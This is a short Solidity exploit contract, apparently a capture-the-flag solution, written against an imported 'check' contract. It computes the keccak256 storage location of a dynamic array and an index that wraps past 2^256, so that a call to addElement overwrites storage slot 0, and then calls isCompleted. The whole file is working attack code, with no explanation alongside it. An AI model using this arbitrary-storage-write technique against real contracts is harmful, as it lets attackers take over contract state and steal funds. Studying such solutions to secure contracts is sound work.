pragma solidity ^0.4.24;
import "./1.sol";
contract Attact{
    check check1;
    constructor(address addr)public{
        check1 = check(addr);
    }
    function getstorage(uint256 slot)public pure returns(bytes32){
        return keccak256(abi.encodePacked(slot));
    }
    function getOverflowindex(uint256 slot)public pure returns(uint256){
        return 2**256-1-slot+1;
    }
    function attact() public {
        check1.arr().addElement(getOverflowindex(uint256(getstorage(1))),1);
        check1.isCompleted();
    }
}